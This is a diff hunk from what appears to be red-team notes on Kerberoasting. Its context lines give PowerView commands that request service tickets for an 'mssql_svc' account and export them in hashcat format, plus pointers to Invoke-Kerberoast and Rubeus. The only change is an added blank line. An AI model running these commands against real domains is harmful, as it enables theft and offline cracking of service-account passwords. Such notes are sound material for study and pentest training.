@@ -54,6 +54,7 @@ We can request service ticket for this `mssql_svc` service account and crack it 
 - We can also use PowerView to request service ticket for this `mssql_svc` service account:  `Get-DomainUser -SPN mssql_svc | Get-DomainSPNTicket`
 - We can also use [Invoke-Kerberoast](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/) to both find and roast kerberoastable accounts.
 -  If you want the hash in specific format for cracking we can also request it using OutputFormat as `Get-DomaintUser -SPN mssql_svc | Get-DomainSPNTicket -OutputFormat hashcat`.
+
 Below we are using Rubeus. 
 
 ```bash
